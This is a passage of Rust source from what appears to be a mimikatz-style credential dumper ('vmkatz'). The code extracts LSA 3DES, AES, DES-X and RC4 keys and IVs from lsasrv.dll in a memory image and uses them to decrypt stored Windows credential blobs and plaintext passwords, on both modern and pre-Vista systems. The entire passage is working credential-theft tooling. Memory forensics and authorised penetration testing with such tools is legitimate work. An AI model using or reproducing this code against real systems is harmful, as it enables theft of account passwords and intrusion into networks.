    let mut iv: Option<[u8; 16]> = None;
    if let Ok((pattern_addr, _)) = pattern_result {
        for offsets in KEY_OFFSET_SETS {
            if let Ok(iv_addr) = patterns::resolve_rip_relative(vmem, pattern_addr, offsets.iv_disp) {
                if let Ok(iv_data) = vmem.read_virt_bytes(iv_addr, 16) {
                    if iv_data.len() == 16 && iv_data.iter().any(|&b| b != 0) {
                        log::info!(
                            "Physical scan: IV at 0x{:x}: {}",
                            iv_addr,
                            hex::encode(&iv_data)
                        );
                        let mut arr = [0u8; 16];
                        arr.copy_from_slice(&iv_data);
                        iv = Some(arr);
                        break;
                    }
                }
            }
        }
    }

    // If IV not found via pattern, try scanning .data for IV-like data near UUUR handle VAs
    if iv.is_none() {
        if let Some(data_sec) = pe.find_section(".data") {
            let data_base = lsasrv_base + data_sec.virtual_address as u64;
            let data_size = data_sec.virtual_size as usize;
            if let Ok(data) = vmem.read_virt_bytes(data_base, data_size) {
                // Find earliest non-zero 16-byte region that looks like random data (not a pointer)
                for off in (0..data_size.saturating_sub(16)).step_by(8) {
                    let candidate = &data[off..off + 16];
                    if candidate.iter().all(|&b| b == 0) {
                        continue;
                    }
                    let val = super::types::read_u64_le(candidate, 0).unwrap_or(0);
                    if val > 0x10000 && (val >> 48 == 0 || val >> 48 == 0xFFFF) && val & 0x7 == 0 {
                        continue; // looks like a pointer
                    }
                    let val2 = super::types::read_u64_le(candidate, 8).unwrap_or(0);
                    if val2 > 0x10000
                        && (val2 >> 48 == 0 || val2 >> 48 == 0xFFFF)
                        && val2 & 0x7 == 0
                    {
                        continue;
                    }
                    if count_unique_bytes(candidate) < 4 {
                        continue;
                    }
                    log::info!(
                        "Physical scan: IV candidate at .data+0x{:x}: {}",
                        off,
                        hex::encode(candidate)
                    );
                    let mut arr = [0u8; 16];
                    arr.copy_from_slice(candidate);
                    iv = Some(arr);
                    break;
                }
            }
        }
    }

    let iv = iv.ok_or_else(|| {
        VmkatzError::PatternNotFound(
            "Physical scan: IV not found (all .data pages paged out)".to_string(),
        )
    })?;

    log::info!(
        "Crypto keys extracted via physical UUUR scan: 3DES={} bytes, AES={} bytes",
        des_key.len(),
        aes_key.len()
    );

    Ok(CryptoKeys {
        iv,
        des_key,
        aes_key,
    })
}

/// Extract key bytes from raw BCRYPT_KEY81 data at a given offset.
///
/// Used by carve mode to extract keys directly from physical pages without
/// following pointer chains. The MSSK tag is at data[offset+4..offset+8].
#[cfg(feature = "carve")]
pub(crate) fn extract_key_from_bcrypt_data(data: &[u8], offset: usize) -> Option<Vec<u8>> {
    if offset + 0x40 > data.len() {
        return None;
    }
    let tag = u32::from_le_bytes(data[offset + 4..offset + 8].try_into().ok()?);
    if tag != MSSK_TAG {
        return None;
    }
    // Try BCRYPT_KEY81 layout: cbSecret at +0x38, key at +0x3C
    if offset + 0x3C + 32 <= data.len() {
        let cb = u32::from_le_bytes(data[offset + 0x38..offset + 0x3C].try_into().ok()?) as usize;
        if matches!(cb, 16 | 24 | 32) && offset + 0x3C + cb <= data.len() {
            let key = &data[offset + 0x3C..offset + 0x3C + cb];
            if key.iter().any(|&b| b != 0) {
                return Some(key.to_vec());
            }
        }
    }
    // Fallback: older layout, cbSecret at +0x18, key at +0x1C
    if offset + 0x1C + 32 <= data.len() {
        let cb = u32::from_le_bytes(data[offset + 0x18..offset + 0x1C].try_into().ok()?) as usize;
        if matches!(cb, 16 | 24 | 32) && offset + 0x1C + cb <= data.len() {
            let key = &data[offset + 0x1C..offset + 0x1C + cb];
            if key.iter().any(|&b| b != 0) {
                return Some(key.to_vec());
            }
        }
    }
    None
}

fn tag_to_str(tag: u32) -> String {
    let bytes = tag.to_le_bytes();
    bytes
        .iter()
        .map(|&b| {
            if b.is_ascii_alphanumeric() || b == b'_' {
                b as char
            } else {
                '.'
            }
        })
        .collect()
}

/// Decrypt an encrypted credential blob.
///
/// Key selection follows mimikatz C logic:
///   if (BufferSize % 8) → AES (data NOT 8-byte aligned)
///   else → 3DES (data IS 8-byte aligned)
///
/// Note: pypykatz has this logic inverted (bug). The original mimikatz C code
/// uses 3DES for 8-aligned data and AES for non-8-aligned data.
pub fn decrypt_credential(keys: &CryptoKeys, encrypted: &[u8]) -> Result<Vec<u8>> {
    if encrypted.is_empty() {
        return Ok(Vec::new());
    }

    if encrypted.len().is_multiple_of(8) {
        // 3DES-CBC (mimikatz: BufferSize % 8 == 0 → h3DesKey)
        decrypt_3des_cbc(&keys.des_key, &keys.iv[..8], encrypted)
    } else {
        // AES-CFB-128 (mimikatz: BufferSize % 8 != 0 → hAesKey, CFB mode)
        decrypt_aes_cfb128(&keys.aes_key, &keys.iv, encrypted)
    }
}

fn decrypt_3des_cbc(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    if key.len() != 24 {
        return Err(VmkatzError::DecryptionError(format!(
            "Invalid 3DES key length: {} (expected 24)",
            key.len()
        )));
    }
    let mut buf = data.to_vec();
    let decryptor = Des3CbcDec::new_from_slices(key, iv)
        .map_err(|e| VmkatzError::DecryptionError(format!("3DES init: {}", e)))?;
    decryptor
        .decrypt_padded_mut::<cbc::cipher::block_padding::NoPadding>(&mut buf)
        .map_err(|e| VmkatzError::DecryptionError(format!("3DES decrypt: {}", e)))?;
    Ok(buf)
}

/// Base64 encode (standard alphabet, with padding).
pub fn base64_encode(data: &[u8]) -> String {
    const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(data.len().div_ceil(3) * 4);
    for chunk in data.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = if chunk.len() > 1 { chunk[1] as u32 } else { 0 };
        let b2 = if chunk.len() > 2 { chunk[2] as u32 } else { 0 };
        let triple = (b0 << 16) | (b1 << 8) | b2;
        out.push(ALPHABET[((triple >> 18) & 0x3F) as usize] as char);
        out.push(ALPHABET[((triple >> 12) & 0x3F) as usize] as char);
        if chunk.len() > 1 {
            out.push(ALPHABET[((triple >> 6) & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(ALPHABET[(triple & 0x3F) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

pub fn decode_utf16_le(data: &[u8]) -> String {
    crate::utils::utf16le_decode(data)
}

/// Decrypt a UNICODE_STRING password field (unified x64/x86).
/// On x86, the buffer pointer is at +4 (4 bytes); on x64, at +8 (8 bytes).
/// Decrypt a UNICODE_STRING password using AES-CFB-8 (for SSP provider).
pub fn decrypt_unicode_string_password_cfb8(
    vmem: &dyn crate::memory::VirtualMemory,
    ustring_addr: u64,
    keys: &CryptoKeys,
    arch: super::types::Arch,
) -> String {
    let pwd_len = vmem.read_virt_u16(ustring_addr).unwrap_or(0) as usize;
    let pwd_max_len = vmem.read_virt_u16(ustring_addr + 2).unwrap_or(0) as usize;
    let buf_offset = match arch {
        super::types::Arch::X64 => 8u64,
        super::types::Arch::X86 => 4,
    };
    let pwd_ptr = super::types::read_ptr(vmem, ustring_addr + buf_offset, arch).unwrap_or(0);
    if pwd_len == 0 || pwd_ptr == 0 {
        return String::new();
    }
    let read_len = pwd_max_len.max(pwd_len);
    let enc_data = match vmem.read_virt_bytes(pwd_ptr, read_len) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    // SSP uses CFB-8 for both 8-aligned and non-8-aligned blobs
    match decrypt_aes_cfb8(&keys.aes_key, &keys.iv, &enc_data) {
        Ok(decrypted) => {
            // Only use Length bytes (not MaximumLength padding)
            let usable = decrypted.len().min(pwd_len);
            decode_utf16_le(&decrypted[..usable])
        }
        Err(_) => String::new(),
    }
}

pub fn decrypt_unicode_string_password_arch(
    vmem: &dyn crate::memory::VirtualMemory,
    ustring_addr: u64,
    keys: &CryptoKeys,
    arch: super::types::Arch,
) -> String {
    let pwd_len = vmem.read_virt_u16(ustring_addr).unwrap_or(0) as usize;
    let pwd_max_len = vmem.read_virt_u16(ustring_addr + 2).unwrap_or(0) as usize;
    let buf_offset = match arch {
        super::types::Arch::X64 => 8u64,
        super::types::Arch::X86 => 4,
    };
    let pwd_ptr = super::types::read_ptr(vmem, ustring_addr + buf_offset, arch).unwrap_or(0);
    if pwd_len == 0 || pwd_ptr == 0 {
        return String::new();
    }
    let read_len = pwd_max_len.max(pwd_len);
    let enc_data = match vmem.read_virt_bytes(pwd_ptr, read_len) {
        Ok(d) => d,
        Err(_) => return String::new(),
    };
    match decrypt_credential(keys, &enc_data) {
        Ok(decrypted) => decode_utf16_le(&decrypted),
        Err(_) => String::new(),
    }
}

/// Decrypt a prefix of encrypted data, trying AES-CBC first, then optionally 3DES-CBC.
///
/// Only decrypts the first `max_bytes` bytes (rounded to cipher block boundary).
/// Used by carve mode for fast trial decryption where only the first ~144 bytes
/// are needed for SHA1 cross-validation.
///
/// Returns [AES_result, 3DES_result]. AES is always attempted (fast, hardware-accelerated).
/// 3DES is only attempted if `try_3des` is true (much slower, pure Rust).
#[cfg(feature = "carve")]
pub fn decrypt_prefix_both(keys: &CryptoKeys, encrypted: &[u8], max_bytes: usize) -> [Option<Vec<u8>>; 2] {
    let mut results = [None, None];

    // Try AES-CFB-128 (handles any size, no block-alignment needed)
    let aes_len = max_bytes.min(encrypted.len());
    if aes_len > 0 {
        let aes_input = &encrypted[..aes_len];
        if let Ok(dec) = decrypt_aes_cfb128(&keys.aes_key, &keys.iv, aes_input) {
            results[0] = Some(dec);
        }
    }

    // Skip 3DES in prefix mode — caller should use decrypt_prefix_3des() separately
    // when needed, to avoid the 100x performance penalty in hot loops.

    results
}

/// Decrypt a prefix using 3DES-CBC only.
///
/// Used by carve mode when blob_size is 8-byte aligned (mimikatz cipher selection).
/// Separate from decrypt_prefix_both to keep 3DES out of the AES fast path.
#[cfg(feature = "carve")]
pub fn decrypt_prefix_3des(keys: &CryptoKeys, encrypted: &[u8], max_bytes: usize) -> Option<Vec<u8>> {
    let des_len = {
        let wanted = max_bytes.min(encrypted.len());
        wanted.div_ceil(8) * 8
    };
    if des_len > encrypted.len() || keys.des_key.len() != 24 {
        return None;
    }
    let des_input = &encrypted[..des_len];
    let iv8 = &keys.iv[..8];
    decrypt_3des_cbc(&keys.des_key, iv8, des_input).ok()
}

/// AES-CFB-128 decryption (128-bit segments).
///
/// LSA uses AES-CFB (not AES-CBC) for non-8-aligned credential blobs.
/// CFB-128 decrypt: plaintext[i] = ciphertext[i] XOR AES_encrypt(feedback[i])
/// where feedback[0] = IV, feedback[i>0] = ciphertext[i-1].
/// Handles any input length (no block alignment needed).
fn decrypt_aes_cfb128(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    if data.is_empty() {
        return Ok(Vec::new());
    }
    let mut output = vec![0u8; data.len()];
    let mut feedback = [0u8; 16];
    feedback.copy_from_slice(&iv[..16]);

    match key.len() {
        16 => {
            let cipher = <Aes128 as des::cipher::KeyInit>::new(
                GenericArray::from_slice(key),
            );
            for (i, chunk) in data.chunks(16).enumerate() {
                let mut block = GenericArray::clone_from_slice(&feedback);
                cipher.encrypt_block(&mut block);
                let offset = i * 16;
                for (j, &ct_byte) in chunk.iter().enumerate() {
                    output[offset + j] = ct_byte ^ block[j];
                }
                // Update feedback: in CFB decrypt, feedback = ciphertext block
                if chunk.len() == 16 {
                    feedback.copy_from_slice(chunk);
                } else {
                    // Partial last block: copy what we have (doesn't matter, last block)
                    feedback[..chunk.len()].copy_from_slice(chunk);
                }
            }
        }
        32 => {
            let cipher = <Aes256 as des::cipher::KeyInit>::new(
                GenericArray::from_slice(key),
            );
            for (i, chunk) in data.chunks(16).enumerate() {
                let mut block = GenericArray::clone_from_slice(&feedback);
                cipher.encrypt_block(&mut block);
                let offset = i * 16;
                for (j, &ct_byte) in chunk.iter().enumerate() {
                    output[offset + j] = ct_byte ^ block[j];
                }
                if chunk.len() == 16 {
                    feedback.copy_from_slice(chunk);
                } else {
                    feedback[..chunk.len()].copy_from_slice(chunk);
                }
            }
        }
        _ => {
            return Err(VmkatzError::DecryptionError(format!(
                "Invalid AES key length: {} (expected 16 or 32)",
                key.len()
            )));
        }
    }
    Ok(output)
}

/// AES-CFB-8 decryption (8-bit segments).
///
/// SSP uses CFB with 8-bit segments (CRYPT_MODE_CFB + KP_MODE_BITS=8).
/// Each byte is decrypted individually: encrypt feedback, XOR first byte
/// with ciphertext byte, then shift ciphertext byte into feedback.
fn decrypt_aes_cfb8(key: &[u8], iv: &[u8], data: &[u8]) -> Result<Vec<u8>> {
    if data.is_empty() {
        return Ok(Vec::new());
    }
    let mut output = vec![0u8; data.len()];
    let mut feedback = [0u8; 16];
    feedback.copy_from_slice(&iv[..16]);

    match key.len() {
        16 => {
            let cipher = <Aes128 as des::cipher::KeyInit>::new(
                GenericArray::from_slice(key),
            );
            for (i, &ct_byte) in data.iter().enumerate() {
                let mut block = GenericArray::clone_from_slice(&feedback);
                cipher.encrypt_block(&mut block);
                output[i] = ct_byte ^ block[0];
                // Shift feedback left by 1 byte, append ciphertext byte
                feedback.copy_within(1.., 0);
                feedback[15] = ct_byte;
            }
        }
        32 => {
            let cipher = <Aes256 as des::cipher::KeyInit>::new(
                GenericArray::from_slice(key),
            );
            for (i, &ct_byte) in data.iter().enumerate() {
                let mut block = GenericArray::clone_from_slice(&feedback);
                cipher.encrypt_block(&mut block);
                output[i] = ct_byte ^ block[0];
                feedback.copy_within(1.., 0);
                feedback[15] = ct_byte;
            }
        }
        _ => {
            return Err(VmkatzError::DecryptionError(format!(
                "Invalid AES key length: {} (expected 16 or 32)",
                key.len()
            )));
        }
    }
    Ok(output)
}

// ---------------------------------------------------------------------------
// Pre-Vista crypto: DES-X-CBC + RC4 (WinXP, Win2003)
// ---------------------------------------------------------------------------

/// Pre-Vista crypto keys extracted from lsasrv.dll.
/// Uses DES-X-CBC (8-byte aligned blobs) or RC4 (non-aligned blobs).
#[derive(Debug, Clone)]
pub struct PreVistaCryptoKeys {
    /// Raw 8-byte DES key
    pub des_key: [u8; 8],
    /// Pre-whitening XOR key (8 bytes)
    pub desx_pre: [u8; 8],
    /// Post-whitening XOR key (8 bytes)
    pub desx_post: [u8; 8],
    /// CBC initialization vector (g_Feedback, 8 bytes)
    pub feedback: [u8; 8],
    /// RC4 key (g_pRandomKey, variable length)
    pub rc4_key: Vec<u8>,
}

/// Decrypt with pre-Vista cipher selection: DES-X-CBC or RC4.
pub fn decrypt_credential_prevista(keys: &PreVistaCryptoKeys, encrypted: &[u8]) -> Result<Vec<u8>> {
    if encrypted.is_empty() {
        return Err(VmkatzError::DecryptionError("empty ciphertext".to_string()));
    }
    if encrypted.len().is_multiple_of(8) {
        decrypt_desx_cbc(keys, encrypted)
    } else {
        Ok(decrypt_rc4(&keys.rc4_key, encrypted))
    }
}

/// DES-X-CBC decryption.
/// For each 8-byte block: XOR post → DES-ECB decrypt → XOR pre → XOR previous ciphertext (CBC).
fn decrypt_desx_cbc(keys: &PreVistaCryptoKeys, encrypted: &[u8]) -> Result<Vec<u8>> {
    if !encrypted.len().is_multiple_of(8) {
        return Err(VmkatzError::DecryptionError("DES-X: data not 8-byte aligned".to_string()));
    }

    let des_cipher = des::Des::new_from_slice(&keys.des_key)
        .map_err(|e| VmkatzError::DecryptionError(format!("DES key init: {}", e)))?;

    let mut result = Vec::with_capacity(encrypted.len());
    let mut prev_ct = keys.feedback;

    for chunk in encrypted.chunks_exact(8) {
        let ct_block: [u8; 8] = chunk.try_into().unwrap_or([0u8; 8]);

        // 1. XOR with post-whitening key
        let mut temp = [0u8; 8];
        for (t, (&ct, &post)) in temp.iter_mut().zip(ct_block.iter().zip(keys.desx_post.iter())) {
            *t = ct ^ post;
        }

        // 2. DES-ECB decrypt
        let block = GenericArray::from_mut_slice(&mut temp);
        des_cipher.decrypt_block(block);

        // 3. XOR with pre-whitening key
        for (t, &pre) in temp.iter_mut().zip(keys.desx_pre.iter()) {
            *t ^= pre;
        }

        // 4. CBC: XOR with previous ciphertext block
        for (t, &prev) in temp.iter_mut().zip(prev_ct.iter()) {
            *t ^= prev;
        }

        prev_ct = ct_block;
        result.extend_from_slice(&temp);
    }

    Ok(result)
}

/// RC4 decryption (symmetric — decrypt = encrypt).
pub fn decrypt_rc4(key: &[u8], data: &[u8]) -> Vec<u8> {
    if key.is_empty() {
        return data.to_vec();
    }

    // KSA (Key Scheduling Algorithm)
    let mut s = [0u8; 256];
    for (i, val) in s.iter_mut().enumerate() {
        *val = i as u8;
    }
    let mut j: u8 = 0;
    for i in 0..256 {
        j = j.wrapping_add(s[i]).wrapping_add(key[i % key.len()]);
        s.swap(i, j as usize);
    }

    // PRGA (Pseudo-Random Generation Algorithm)
    let mut result = Vec::with_capacity(data.len());
    let mut i: u8 = 0;
    let mut j: u8 = 0;
    for &byte in data {
        i = i.wrapping_add(1);
        j = j.wrapping_add(s[i as usize]);
        s.swap(i as usize, j as usize);
        let k = s[(s[i as usize].wrapping_add(s[j as usize])) as usize];
        result.push(byte ^ k);
    }
    result
}

/// Extract pre-Vista crypto keys from lsasrv.dll (32-bit).
///
/// The DESX key structure (g_pDESXKey) is 144 bytes:
///   - pre-whitening key (8 bytes)
///   - DES key schedule (128 bytes) — we extract the raw DES key from it
///   - post-whitening key (8 bytes)
pub fn extract_prevista_crypto_keys(
    vmem: &dyn VirtualMemory,
    lsasrv_base: u64,
    lsasrv_size: u64,
) -> Result<PreVistaCryptoKeys> {
    let pe = PeHeaders::parse_from_memory(vmem, lsasrv_base)?;

    let text = pe
        .find_section(".text")
        .ok_or_else(|| VmkatzError::PatternNotFound(".text section in lsasrv.dll (pre-Vista)".to_string()))?;

    // Try pattern-based extraction first
    if let Ok((pattern_addr, pat_idx)) = patterns::find_pattern(
        vmem,
        lsasrv_base + text.virtual_address as u64,
        text.virtual_size,
        patterns::PREVISTA_KEY_PATTERNS,
        "PreVista-LsaInitializeProtectedMemory",
    ) {
        if pat_idx < patterns::PREVISTA_KEY_OFFSET_SETS.len() {
            let (desx_off, fb_off, rk_off) = patterns::PREVISTA_KEY_OFFSET_SETS[pat_idx];

            // Resolve absolute addresses (x86: absolute, not RIP-relative)
            if let Ok(keys) = extract_prevista_keys_from_offsets(
                vmem, pattern_addr, desx_off, fb_off, rk_off,
            ) {
                return Ok(keys);
            }
        }
    }

    // Fallback: scan .data section for DESX key structure by entropy
    extract_prevista_keys_data_scan(vmem, &pe, lsasrv_base, lsasrv_size)
}

/// Extract keys using known code offsets (pattern-based).
fn extract_prevista_keys_from_offsets(
    vmem: &dyn VirtualMemory,
    pattern_addr: u64,
    desx_off: i64,
    fb_off: i64,
    rk_off: i64,
) -> Result<PreVistaCryptoKeys> {
    // g_pDESXKey: pointer to DESX key structure
    let desx_ptr_addr = patterns::resolve_absolute_address(vmem, pattern_addr, desx_off)?;
    let desx_ptr = vmem.read_virt_u32(desx_ptr_addr)? as u64;
    if desx_ptr < 0x10000 {
        return Err(VmkatzError::PatternNotFound("g_pDESXKey null".to_string()));
    }

    // Read the 144-byte DESX structure (size guaranteed by read_virt_bytes)
    let desx_struct = vmem.read_virt_bytes(desx_ptr, 144)?;
    let mut desx_pre = [0u8; 8];
    desx_pre.copy_from_slice(&desx_struct[0..8]);
    // DES key schedule is 128 bytes at offset 8 — extract raw key from first 8 bytes
    // The DES key schedule's first entry contains a permuted version of the key,
    // but for des::Des we need the original 8-byte key. In the NT5 DESX structure,
    // the original key is the first 8 bytes of the schedule (before PC-1 permutation).
    // Actually, Windows stores the raw key at the start of the schedule for backward compat.
    let mut des_key = [0u8; 8];
    des_key.copy_from_slice(&desx_struct[8..16]);
    let mut desx_post = [0u8; 8];
    desx_post.copy_from_slice(&desx_struct[136..144]);

    // g_Feedback: 8-byte IV
    let fb_addr = patterns::resolve_absolute_address(vmem, pattern_addr, fb_off)?;
    let mut feedback = [0u8; 8];
    vmem.read_virt(fb_addr, &mut feedback)?;

    // g_pRandomKey: pointer to RC4 key blob
    let rk_ptr_addr = patterns::resolve_absolute_address(vmem, pattern_addr, rk_off)?;
    let rk_ptr = vmem.read_virt_u32(rk_ptr_addr)? as u64;
    let rc4_key = if rk_ptr >= 0x10000 {
        // RC4 key blob: DWORD cbKey at +0, key bytes at +4
        let cb_key = vmem.read_virt_u32(rk_ptr)? as usize;
        if cb_key > 0 && cb_key <= 256 {
            vmem.read_virt_bytes(rk_ptr + 4, cb_key)?
        } else {
            // Fallback: try reading 64 bytes
            vmem.read_virt_bytes(rk_ptr, 64)?
        }
    } else {
        Vec::new()
    };

    log::info!(
        "Pre-Vista keys: DES key={}, pre={}, post={}, IV={}, RC4 key {} bytes",
        hex::encode(des_key), hex::encode(desx_pre), hex::encode(desx_post),
        hex::encode(feedback), rc4_key.len()
    );

    Ok(PreVistaCryptoKeys {
        des_key,
        desx_pre,
        desx_post,
        feedback,
        rc4_key,
    })
}

/// Fallback: scan .data section for DESX key structure by entropy analysis.
/// DESX structure = pre(8) + DES_KEY_SCHEDULE(128) + post(8) = 144 bytes.
/// The schedule has high entropy; pre/post are 8 random bytes each.
fn extract_prevista_keys_data_scan(
    vmem: &dyn VirtualMemory,
    pe: &PeHeaders,
    lsasrv_base: u64,
    _lsasrv_size: u64,
) -> Result<PreVistaCryptoKeys> {
    let data_sect = pe
        .find_section(".data")
        .ok_or_else(|| VmkatzError::PatternNotFound(".data section in lsasrv.dll (pre-Vista)".to_string()))?;

    let data_base = lsasrv_base + data_sect.virtual_address as u64;
    let data_size = data_sect.virtual_size as usize;
    let data = vmem.read_virt_bytes(data_base, data_size)?;

    // Scan for pointers in .data that could be g_pDESXKey
    // Look for 4-byte aligned addresses that point to a 144-byte structure with high entropy
    for off in (0..data.len().saturating_sub(4)).step_by(4) {
        let ptr = super::types::read_u32_le(&data, off).unwrap_or(0) as u64;
        if !(0x10000..=0x80000000).contains(&ptr) {
            continue;
        }

        // Try reading 144 bytes at this pointer
        let structure = match vmem.read_virt_bytes(ptr, 144) {
            Ok(s) => s,
            Err(_) => continue,
        };

        // Check entropy: the DES key schedule (bytes 8-136) should have >=80 unique bytes
        if (count_unique_bytes(&structure[8..136]) as usize) < 80 {
            continue;
        }

        // Pre/post whitening keys should be non-zero
        if structure[0..8].iter().all(|&b| b == 0) || structure[136..144].iter().all(|&b| b == 0) {
            continue;
        }

        let mut desx_pre = [0u8; 8];
        desx_pre.copy_from_slice(&structure[0..8]);
        let mut des_key = [0u8; 8];
        des_key.copy_from_slice(&structure[8..16]);
        let mut desx_post = [0u8; 8];
        desx_post.copy_from_slice(&structure[136..144]);

        // Look for g_Feedback and g_pRandomKey nearby (within ±0x100)
        let feedback = find_feedback_nearby(vmem, &data, off, data_base)?;
        let rc4_key = find_rc4_key_nearby(vmem, &data, off, data_base);

        log::info!(
            "Pre-Vista keys (data scan): DES key={}, pre={}, post={}, IV={}, RC4 {} bytes",
            hex::encode(des_key), hex::encode(desx_pre), hex::encode(desx_post),
            hex::encode(feedback), rc4_key.len()
        );

        return Ok(PreVistaCryptoKeys {
            des_key,
            desx_pre,
            desx_post,
            feedback,
            rc4_key,
        });
    }

    Err(VmkatzError::PatternNotFound("Pre-Vista DESX key structure in .data".to_string()))
}

/// Find the 8-byte feedback (IV) near the DESX key pointer in .data.
fn find_feedback_nearby(
    vmem: &dyn VirtualMemory,
    data: &[u8],
    desx_off: usize,
    data_base: u64,
) -> Result<[u8; 8]> {
    // g_Feedback is typically within ±0x100 of g_pDESXKey in .data
    let start = desx_off.saturating_sub(0x100);
    let end = (desx_off + 0x100).min(data.len().saturating_sub(8));

    for off in (start..end).step_by(4) {
        // Skip the DESX key pointer itself and surrounding pointers
        if off.abs_diff(desx_off) < 8 {
            continue;
        }
        let candidate = &data[off..off + 8];
        // Feedback should be non-zero, not look like a pointer, have some uniqueness
        if candidate.iter().all(|&b| b == 0) {
            continue;
        }
        let as_u32 = super::types::read_u32_le(candidate, 0).unwrap_or(0);
        // Skip if it looks like a pointer (common .data pattern)
        if (0x10000..0x80000000).contains(&as_u32) {
            continue;
        }
        // Check for some byte diversity (at least 3 unique bytes)
        if count_unique_bytes(candidate) >= 3 {
            let mut feedback = [0u8; 8];
            feedback.copy_from_slice(candidate);
            return Ok(feedback);
        }
    }

    // Fallback: try reading g_Feedback directly from vmem at data_base + nearby offset
    let _ = (vmem, data_base);
    Ok([0u8; 8]) // Zero IV as last resort
}

/// Find the RC4 key near the DESX key pointer in .data.
fn find_rc4_key_nearby(
    vmem: &dyn VirtualMemory,
    data: &[u8],
    desx_off: usize,
    data_base: u64,
) -> Vec<u8> {
    let start = desx_off.saturating_sub(0x100);
    let end = (desx_off + 0x100).min(data.len().saturating_sub(4));

    for off in (start..end).step_by(4) {
        if off.abs_diff(desx_off) < 8 {
            continue;
        }
        let ptr = super::types::read_u32_le(data, off).unwrap_or(0) as u64;
        if !(0x10000..=0x80000000).contains(&ptr) {
            continue;
        }

        // Try reading as RC4 key blob: DWORD cbKey + key bytes
        if let Ok(cb_key) = vmem.read_virt_u32(ptr) {
            if cb_key > 0 && cb_key <= 256 {
                if let Ok(key_data) = vmem.read_virt_bytes(ptr + 4, cb_key as usize) {
                    // Validate: key should have some entropy
                    if count_unique_bytes(&key_data) >= 8 {
                        return key_data;
                    }
                }
            }
        }
    }

    let _ = data_base;
    Vec::new()
}
